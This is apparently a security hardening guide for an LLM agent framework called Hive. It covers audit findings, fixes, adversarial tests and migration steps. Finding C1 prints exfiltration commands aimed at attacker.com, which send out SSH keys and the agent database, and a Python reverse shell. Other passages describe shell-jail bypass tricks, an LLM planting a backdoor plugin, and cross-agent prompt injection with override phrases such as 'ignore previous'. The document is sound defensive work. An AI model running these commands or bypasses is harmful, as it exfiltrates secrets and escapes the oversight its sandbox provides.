# Hive Framework Hardening — Complete Guide

**Version:** 0.6.1 → 0.7.0
**Date:** 2026-07-22
**Branch:** fix/framework-hardening

---

## Table of Contents

1. [Security Audit Findings](#security-audit-findings)
2. [Hardening Changes — Detailed Specs & Prompts](#hardening-changes)
3. [Adversarial Test Suite](#adversarial-test-suite)
4. [Migration Guide](#migration-guide)

---

## Security Audit Findings

### Risk Matrix

| Severity | Count | Key Examples |
|----------|-------|--------------|
| **CRITICAL** | 3 | Shell RCE via DEV_COMMANDS, Plugin arbitrary exec, Orchestrator workspace escape |
| **HIGH** | 4 | LinkToolkit SSRF, Cross-agent prompt injection, Sub-agent privilege multiplication, Guardrails disabled |
| **MEDIUM** | 5 | Clipboard exfiltration, Goal injection, Scheduled prompt injection, MCP untrusted args, File writes |
| **LOW** | 3 | osascript (mitigated), Git (mitigated), Notepad (mitigated) |
| **NONE** | 2 | SQL injection (parameterized), Notepad path traversal (validated) |

### Critical Findings

#### C1: Shell RCE via DEV_COMMANDS

**Status:** Mitigated (Change 1) -- default is now `False` (was `True` in 0.6.x)

**File:** `src/hive/tools/shell/toolkit.py`
**Config:** `tools.shell_allow_dev_commands` (default: `False`; opt in with `true`)

When `allow_dev_commands=True`, these commands are allowed:
```
python, python3, pip, uv, node, npm, npx, git, ruff, mypy, pytest,
cargo, go, make, curl, wget, sed, awk, tee, env
```

**Attack vectors:**
```bash
python -c "import os; os.system('curl attacker.com -d @.hive/hive.db')"
curl http://attacker.com/exfil -d "$(cat ~/.ssh/id_rsa)"
python -c "import socket,subprocess;s=socket.socket();s.connect(('attacker.com',4444));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())"
```

#### C2: Shell Workspace Jail is Advisory-Only

**Status:** Mitigated (Change 3 + Phase A) -- file-path shell commands are validated against the agent workspace; tilde/env expansion and flag-value paths are blocked in restricted mode

**File:** `src/hive/tools/shell/toolkit.py`

`SAFE_COMMANDS` includes `cat`, `head`, `tail`, `grep`, `find`. Before Change 3, these could read any path on the system because the workspace jail applied only to `FileToolkit`. Path arguments are now checked via `_check_paths_in_command()`.

**Phase A hardening (restricted mode):**

- Path tokens containing shell expansion metacharacters (`~`, `$`, `` ` ``, `%`) are rejected before subprocess execution. Use workspace-relative paths (`foo`, `./foo`) instead of `~/...` or `$HOME/...`.
- Commands are tokenized with `shlex.split(posix=True)` before path validation so quoted host paths (`cat "/etc/passwd"`) cannot bypass the jail; invalid quoting is rejected.
- Flag-value file operands are jailed the same as positional paths: `grep -f`, `grep --file`, `grep --exclude-from`, `sort -o`, `sort --output`, `jq -f` / `--from-file`, and `jq -L` / `--library-path` -- including attached short forms like `-o/tmp/out`, `-f/etc/hosts`, `-L/outside`.
- Dangerous sort flags are rejected outright: `sort --files0-from` (NUL-separated list can reference paths outside workspace) and `sort --compress-program` (executes arbitrary programs).
- Residual bypass when `tools.shell_allow_dev_commands: true` -- interpreters and network tools can still escape the jail; keep default `False` for untrusted agents.

**Phase 3 shell boundaries (stabilization-03):**

- Restricted mode blocks filesystem existence oracles: `test -f /etc/passwd`, `[ -f ... ]`, and `[[ -f ... ]]` against absolute paths outside the agent workspace (`tests/adversarial/test_shell_sandbox.py`).
- Temp-dir containment: `sort -T /tmp` (and similar outside-workspace `-T` values) is denied or rewritten; workspace subprocesses should use `.hive/tmp` under the agent workspace. Set `TMPDIR` to a workspace-local path when spawning shell commands so utilities that honor `TMPDIR` cannot write outside the jail.
- Parser/subprocess differential risk (`create_subprocess_shell` vs `shlex` tokenization) remains a documented hypothesis -- see stabilization-03 Slice 3.3 (deferred).

#### C3: Plugin System Executes Arbitrary Code

**Status:** Mitigated (Change 4) -- default is now `False` (was `True` in 0.6.x)

**File:** `src/hive/runtime/plugin_loader.py`
**Config:** `plugins.enabled` (default: `False`; opt in with `true`)

Any `.py` file in `.hive/plugins/` is loaded with full process privileges. Hot-loaded every 10 cycles.

**Attack:** LLM writes `.hive/plugins/backdoor.py` via `file_write` → executed within 10 heartbeats.

### High Findings

#### H1: LinkToolkit Has No SSRF Protection

**Status:** Mitigated (Change 2) -- `LinkToolkit` uses `fetch_url_safe()` from `hive.tools.url_safety`

**File:** `src/hive/tools/links/toolkit.py`

`WebToolkit` and `LinkToolkit` both route HTTP fetches through shared SSRF guards in `url_safety.py` (private IP blocking, DNS rebinding pinning, redirect validation). Requests to private IPs, cloud metadata, and localhost are blocked.

#### H2: Cross-Agent Prompt Injection

**Status:** Partially mitigated (Change 6) -- INPUT guardrails run on inbox content when `guardrails.enabled: true`

**Files:** `src/hive/tools/comms/toolkit.py`, `src/hive/tools/a2a/toolkit.py`

Agents can still send arbitrary messages to other agents. When guardrails are enabled, inbox content is filtered before it reaches the LLM context.

#### H3: Sub-Agent Privilege Multiplication

**Status:** Mitigated (Change 9) -- sub-agents receive a restricted toolkit allowlist by default

**Files:** `src/hive/daemon/toolkit_factory.py`, `src/hive/tools/sub_agents/toolkit.py`
**Config:** `tools.sub_agent_toolkits` (default: `null` -- uses `DEFAULT_SUB_AGENT_TOOLKITS`)

Sub-agents no longer inherit the full parent toolkit. When `sub_agent_toolkits` is unset,
they receive only: file, memory, notepad, web, knowledge, links, clipboard, comms, a2a,
task, alarm, and sub_agents. Excluded: shell, git, delegation, schedule, orchestrator,
plugins, and world. Depth and fan-out limits remain: `MAX_DEPTH=2`, `MAX_CHILDREN=5`.

**Residual caveats:**

- Depth-2 fan-out is still possible -- a parent can spawn up to 5 sub-agents, each of
  which can spawn up to 5 more (25 agents at maximum fan-out).
- Setting `tools.sub_agent_toolkits` explicitly can re-enable high-risk toolkits (e.g.
  shell) for sub-agents. The daemon logs a warning when the allowlist includes
  known risky keys (`shell`, `orchestrator`, `plugins`, etc.).

#### H4: Guardrails Disabled by Default

**Config:** `guardrails.enabled` (default: `False`)

Even when enabled, regex-based patterns are easily bypassed (encoding tricks,
synonyms, multilingual phrasing). The built-in `prompt_injection` guardrail
includes high-signal variants (`ignore previous`, `forget instructions`,
`new instructions:`) but is not a substitute for network isolation, approval
gates, or treating operator/API inputs as trusted only on localhost.

For production deployments that want tighter defaults without changing global
out-of-the-box behavior, copy `profiles/_secure.yaml.example` into
`.hive/config.yaml` (guardrails + approval on, dev shell commands off,
plugins off).

### Well-Defended Areas

- **Operator injection** -- `&&`, `||`, `;`, `|`, `$()`, backtick all blocked
- **SSRF (WebToolkit, LinkToolkit)** -- shared `url_safety` guards with IP validation + DNS rebinding prevention for HTTP (IP-pinned). HTTPS validates public resolution but connects by hostname (SNI); see `src/hive/tools/url_safety.py` module doc.
- **Shell path jail** -- file-path commands validated against agent workspace
- **SQL injection** -- All queries parameterized
- **osascript injection** — Proper escaping
- **Git option injection** — `--` separator
- **Sub-agent toolkit allowlist** -- spawned agents exclude shell, git, delegation, schedule, orchestrator, plugins, and world by default

### Attack Surface Map

```
LLM Output (untrusted)
    │
    ├── shell_exec(command) ──────────────► asyncio.create_subprocess_shell()
    │   ├── requires_approval=True (gated when approval.enabled)
    │   └── DEV_COMMANDS: python, curl, node (DEFAULT: DISALLOWED; opt in)
    │
    ├── file_write(path, content) ────────► Path.write_text() [workspace-contained]
    │
    ├── web_fetch(url) ───────────────────► httpx.get() [SSRF-guarded]
    │
    ├── scrape_link(url) ─────────────────► fetch_url_safe() [SSRF-guarded]
    ├── save_link(url) ───────────────────► fetch_url_safe() [SSRF-guarded]
    │
    ├── send_message(target, message) ────► JSONL file [guardrails when enabled]
    ├── send_a2a_message(target, body) ───► A2A store [guardrails when enabled]
    │
    ├── spawn_sub_agent(task) ────────────► New agent with restricted toolkit allowlist
    │
    ├── run_code_task(task, workspace) ───► Claude Code/Codex subprocess [workspace-bound]
    │
    ├── set_alarm(description) ───────────► osascript [ESCAPED]
    │
    ├── copy_to_clipboard(text) ──────────► pbcopy/xclip
    ├── read_clipboard() ─────────────────► pbpaste/xclip [10KB truncation limit]
    │
    └── schedule_goal(objective) ─────────► SQLite [PARAMETERIZED]
```

---

## Hardening Changes

### Change 1: Default `allow_dev_commands` to False

**Status:** Implemented (0.7.0)

**Priority:** P0 (Critical)
**Effort:** 1 line
**Risk:** Breaking change — users who rely on dev commands must opt-in

**File:** `src/hive/config.py`

```python
# BEFORE (line ~215)
shell_allow_dev_commands: bool = True

# AFTER
shell_allow_dev_commands: bool = False
```

**Prompt for implementation:**
```
Change the default value of `shell_allow_dev_commands` in src/hive/config.py from True to False.
This is a security hardening change. The DEV_COMMANDS set includes python, node, curl, wget
and other commands that allow arbitrary code execution. By defaulting to False, agents must
explicitly opt-in to these dangerous commands.

Update the comment above the field to explain why the default is False.
```

---

### Change 2: Add SSRF Guard to LinkToolkit

**Status:** Implemented (0.7.0) -- uses `hive.tools.url_safety.fetch_url_safe`

**Priority:** P0 (Critical)
**Effort:** ~30 lines

**File:** `src/hive/tools/links/toolkit.py`

**What to do:**
1. Import `_validate_url` from `hive.tools.web.toolkit`
2. Add validation to `save_link()` before the httpx request
3. Add validation to `scrape_link()` before the httpx request
4. Return error message if validation fails

**Prompt for implementation:**
```
Add SSRF protection to src/hive/tools/links/toolkit.py by importing and using _validate_url
from src/hive/tools/web/toolkit.py.

The _validate_url function returns a tuple of (error_message, validated_ip). If error_message
is not None, the URL should be blocked.

Steps:
1. Add `from hive.tools.web.toolkit import _validate_url` to imports
2. In save_link(), before the httpx.AsyncClient block, add:
   error, _ = _validate_url(url)
   if error:
       return f"Blocked: {error}"
3. In scrape_link(), before the httpx.AsyncClient block, add the same validation
4. Add tests to tests/adversarial/test_ssrf_bypass.py verifying LinkToolkit blocks private IPs

The validation must happen BEFORE the HTTP request, not after.
```

---

### Change 3: Add Path Restriction to Shell Safe Commands

**Status:** Implemented (0.7.0); expanded in Phase A (2026-07-23)

**Priority:** P1 (High)
**Effort:** ~40 lines

**File:** `src/hive/tools/shell/toolkit.py`

**What to do:**
1. Add `_FILE_PATH_COMMANDS` set listing commands that accept file paths
2. Add `_check_paths_in_command()` method
3. Call it from `_check_command()` after the allowlist check
4. For `grep`, skip flags and pattern argument before validating paths

**Prompt for implementation:**
```
Add workspace path validation to shell commands that accept file paths in
src/hive/tools/shell/toolkit.py.

Commands that accept file paths: cat, head, tail, grep, touch, mkdir, cp, mv, rm

Implementation:
1. Add a class attribute:
   _FILE_PATH_COMMANDS = {"cat", "head", "tail", "grep", "touch", "mkdir", "cp", "mv", "rm"}

2. Add a method _check_paths_in_command(self, base: str, cmd: str) -> str | None:
   - Parse command arguments (skip flags starting with -)
   - For grep: skip flags AND the first non-flag argument (the pattern)
   - For other commands: all non-flag arguments are file paths
   - For each path argument:
     * Resolve against self._workspace
     * Check is_relative_to(self._workspace)
     * Return error if path escapes workspace

3. In _check_command(), after the allowlist check, add:
   if base in self._FILE_PATH_COMMANDS:
       path_error = self._check_paths_in_command(base, cmd)
       if path_error:
           return path_error

4. Add tests verifying:
   - `cat /etc/passwd` is blocked
   - `cat test.txt` (in workspace) is allowed
   - `grep -r "pattern" /etc/` is blocked
   - `grep "pattern" test.txt` (in workspace) is allowed
```

**Phase A additions (2026-07-23):**

1. Reject path tokens containing `~`, `$`, `` ` ``, or `%` before subprocess (prevents shell expansion bypass when `HOME=workspace`).
2. Validate flag-value paths: `grep -f`/`--file`/`--exclude-from`, `sort -o`/`--output`, `jq -f`/`--from-file`, `jq -L`/`--library-path`, `jq --slurpfile`/`--rawfile` file operands (including attached short forms like `-o/tmp/out`).
3. Reject dangerous sort flags: `sort --files0-from`, `sort --compress-program`.
4. Tokenize with `shlex.split(posix=True)` before path validation so quoted paths cannot bypass the jail.
5. Adversarial tests in `tests/adversarial/test_shell_sandbox.py`: `TestShellExpansionBypass`, `TestFlagValuePathBypass`, `TestQuotedPathBypass`, `TestAttachedFlagPathBypass`, `TestSortDangerousFlags`.

---

### Change 4: Default `plugins.enabled` to False

**Status:** Implemented (0.7.0)

**Priority:** P1 (High)
**Effort:** 1 line

**File:** `src/hive/config.py`

```python
# BEFORE
enabled: bool = True

# AFTER
enabled: bool = False
```

**Prompt for implementation:**
```
Change the default value of `enabled` in PluginsConfig in src/hive/config.py from True to False.
Plugins execute arbitrary Python code with full process privileges. Update the docstring to
explain why the default is False.
```

---

### Change 5: Restrict Orchestrator Workspace

**Status:** Implemented (0.7.0)

**Priority:** P1 (High)
**Effort:** ~20 lines

**Files:** `src/hive/orchestrator/toolkit.py`, `src/hive/daemon/toolkit_factory.py`

**What to do:**
1. Add `_agent_workspace` attribute to `OrchestratorToolkit`
2. Add `set_workspace()` method
3. In `run_code_task()`, validate workspace is within agent's workspace
4. In `toolkit_factory.py`, call `set_workspace()` after binding

**Prompt for implementation:**
```
Restrict the orchestrator workspace to the agent's own workspace directory.

In src/hive/orchestrator/toolkit.py:
1. Add to __init__: self._agent_workspace = None
2. Add method:
   def set_workspace(self, workspace: Path) -> None:
       self._agent_workspace = workspace.resolve()
3. In run_code_task(), after the is_dir() check, add:
   if self._agent_workspace is not None:
       if not workspace_path.is_relative_to(self._agent_workspace):
           return f"Error: workspace '{workspace}' is outside your allowed workspace."

In src/hive/daemon/toolkit_factory.py:
4. After `orch_tk.bind(agent_id)`, add:
   orch_tk.set_workspace(workspace)
```

---

### Change 6: Apply Guardrails to Inter-Agent Content

**Status:** Implemented (0.7.0)

**Priority:** P2 (Medium)
**Effort:** ~50 lines

**Files:** `src/hive/tools/comms/toolkit.py`, `src/hive/tools/a2a/toolkit.py`

**Prompt for implementation:**
```
Apply input guardrails to inter-agent messages to prevent cross-agent prompt injection.

In src/hive/tools/comms/toolkit.py:
1. Add optional guardrails parameter to __init__
2. In read_inbox(), apply guardrails to each message body before returning
3. If guardrails block a message, replace with "[Message blocked by guardrail]"

In src/hive/tools/a2a/toolkit.py:
1. Add optional guardrails parameter to __init__
2. In check_inbox() and read_inbox(), apply guardrails to message content

In src/hive/daemon/toolkit_factory.py:
3. Build guardrail pipeline and pass to CommsToolkit and A2AToolkit constructors
```

---

### Change 7: Flag `shell_exec` with `requires_approval`

**Status:** Implemented (0.7.0) -- `@tool(requires_approval=True)` on `shell_exec`

**Priority:** P2 (Medium)
**Effort:** 1 line

**File:** `src/hive/tools/shell/toolkit.py`

```python
# BEFORE
@tool()
async def shell_exec(self, command: str) -> str:

# AFTER
@tool(requires_approval=True)
async def shell_exec(self, command: str) -> str:
```

**Prompt for implementation:**
```
Change the @tool() decorator on shell_exec to @tool(requires_approval=True).
This ensures that when the approval system is enabled, shell commands require
human approval before execution.
```

---

### Change 8: Add `read_clipboard` Content Limit

**Status:** Implemented (0.7.0) -- `MAX_CLIPBOARD_BYTES = 10_000` with truncation

**Priority:** P2 (Medium)
**Effort:** ~5 lines

**File:** `src/hive/tools/clipboard/toolkit.py`

**Prompt for implementation:**
```
Add a content size limit to read_clipboard() in src/hive/tools/clipboard/toolkit.py.

1. Add constant: MAX_CLIPBOARD_BYTES = 10_000
2. In read_clipboard(), before returning, check:
   if len(text) > MAX_CLIPBOARD_BYTES:
       return f"Clipboard content truncated ({len(text)} chars > {MAX_CLIPBOARD_BYTES} limit):\n{text[:MAX_CLIPBOARD_BYTES]}..."
```

---

### Change 9: Restrict Sub-Agent Toolkit Allowlist

**Status:** Implemented (0.7.0)

**Priority:** P1 (High)
**Effort:** ~30 lines

**Files:** `src/hive/config.py`, `src/hive/daemon/toolkit_factory.py`

**What changed:**

1. Added `tools.sub_agent_toolkits: list[str] | None = None` to `ToolsConfig`
2. `ToolkitFactory.build(..., is_sub_agent=True)` filters toolkits to the allowlist
3. When config is `null`, sub-agents use `DEFAULT_SUB_AGENT_TOOLKITS`:
   `file`, `memory`, `notepad`, `web`, `knowledge`, `links`, `clipboard`, `comms`,
   `a2a`, `task`, `alarm`, `sub_agents`
4. Parent agents always receive the unrestricted full toolkit set

**Config override:**

```yaml
tools:
  sub_agent_toolkits: ["file", "notepad"]  # custom allowlist for sub-agents
```

**Residual caveats:** depth-2 fan-out (`MAX_DEPTH=2`, `MAX_CHILDREN=5`) still allows
up to 25 spawned agents. An explicit allowlist can re-enable shell or other excluded
toolkits -- use only when you accept the privilege-multiplication risk.

---

## Adversarial Test Suite

### Test Files

| File | Tests | Coverage |
|------|-------|----------|
| `tests/adversarial/test_shell_sandbox.py` | 40 | Operator injection, redirect injection, allowlist bypass, workspace jail |
| `tests/adversarial/test_ssrf_bypass.py` | 15 | Private IP ranges, non-http schemes, DNS rebinding, redirect validation |
| `tests/adversarial/test_daemon_resilience.py` | 15 | Budget exhaustion, phase guards, hook registry edge cases |
| `tests/adversarial/test_approval_bypass.py` | 7 | Policy edge cases, config defaults, timeout behavior |
| `tests/adversarial/test_resource_exhaustion.py` | 5 | Wake source cleanup, event log stress, FD leak detection |
| `tests/adversarial/test_sub_agent_privileges.py` | 12 | Sub-agent toolkit allowlist, depth/child limits, orchestrator/plugin exclusion |

### Running the Tests

```bash
# Run all adversarial tests
python -m pytest tests/adversarial/ -v

# Run specific test file
python -m pytest tests/adversarial/test_shell_sandbox.py -v

# Run full test suite
python -m pytest tests/ -x --tb=short -q
```

### Key Findings from Adversarial Tests

1. **`cat /etc/passwd` is blocked** in restricted mode -- shell path jail rejects paths outside the workspace
2. **All operator injection blocked** -- `&&`, `||`, `;`, `|`, `$()`, backtick properly rejected
3. **All SSRF bypass attempts blocked** -- private IPs, non-http schemes, cloud metadata (WebToolkit and LinkToolkit)
4. **Budget tracker is concurrency-safe** — concurrent record() calls maintain consistency
5. **Phase guards fail-open** — guard exceptions don't block the daemon
6. **Hook registry is resilient** — handler exceptions don't break other handlers
7. **Wake sources clean up properly** — no task leaks on cancellation

---

## Migration Guide

### For Users Upgrading from 0.6.x

Defaults changed in 0.7.0. You must **opt in explicitly** to restore prior behavior.

#### Breaking Change 1: Shell Dev Commands

Default is now `false`. If your agents rely on `python`, `curl`, or other dev commands, add to `.hive/config.yaml`:

```yaml
tools:
  shell_allow_dev_commands: true  # opt in -- not the default
```

#### Breaking Change 2: Plugins

Default is now `false`. If you use plugins, add to `.hive/config.yaml`:

```yaml
plugins:
  enabled: true  # opt in -- not the default
```

#### Breaking Change 3: Orchestrator Workspace

If your agents need to work in directories outside their workspace, you'll need to adjust the workspace configuration or use symlinks within the workspace.

---

## Files Modified

### Source Files

| File | Change |
|------|--------|
| `src/hive/config.py` | Default `allow_dev_commands` and `plugins.enabled` to False; add `sub_agent_toolkits` |
| `src/hive/tools/url_safety.py` | Shared SSRF guards and safe HTTP fetch |
| `src/hive/tools/links/toolkit.py` | SSRF guard via `fetch_url_safe` |
| `src/hive/tools/shell/toolkit.py` | Path containment for file commands; `shell_exec` requires approval |
| `src/hive/tools/clipboard/toolkit.py` | `MAX_CLIPBOARD_BYTES` truncation on `read_clipboard` |
| `src/hive/orchestrator/toolkit.py` | Add workspace restriction |
| `src/hive/daemon/toolkit_factory.py` | Set orchestrator workspace; sub-agent toolkit allowlist |
| `src/hive/daemon/loop.py` | Atomic PID file write |
| `src/hive/daemon/diagnostics.py` | Fix SQLite connection leak |
| `src/hive/server/routes/agents.py` | Replace assert with HTTPException |
| `src/hive/server/routes/sessions.py` | Replace assert with HTTPException |
| `src/hive/server/routes/tasks.py` | Replace assert with HTTPException |
| `src/hive/server/routes/approvals.py` | Replace assert with HTTPException |
| `src/hive/tools/knowledge/toolkit.py` | Replace assert with RuntimeError |

### Test Files

| File | Tests |
|------|-------|
| `tests/adversarial/test_shell_sandbox.py` | 40 |
| `tests/adversarial/test_ssrf_bypass.py` | 15 |
| `tests/adversarial/test_daemon_resilience.py` | 15 |
| `tests/adversarial/test_approval_bypass.py` | 7 |
| `tests/adversarial/test_resource_exhaustion.py` | 5 |
| `tests/adversarial/test_sub_agent_privileges.py` | 12 |
| `tests/cli/test_cli.py` | +10 (stop, restart, daemon, new) |
| `tests/test_solid_validation.py` | +1 (cli/main.py size guardrail) |

### Documentation Files

| File | Description |
|------|-------------|
| `docs/hardening-guide.md` | This file -- complete hardening guide |

---

## Extension Points (Registered by Default)

| Extension | Default behavior |
|-----------|------------------|
| `CostBudgetGuard` | Blocks `goal_pursuit` and `goal_generation` when budget exceeded |
| `ManualPauseGuard` | Blocks all phases when `hive daemon pause` / `.hive/daemon.paused` |
| `A2AWakeSource` | Wakes on A2A inbox activity |
| `NudgeWakeSource` | Wakes on new files in `<hive>/nudges/` |
| `PassiveSwarmPolicy` | Debug logs for swarm recommendations |

Optional: `DefaultSwarmPolicy` (verbose routing logs), `FileWakeSource` via
`daemon.watch_files`, custom guards and wake sources via hooks / `add_wake_source`.

---

## References

- [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
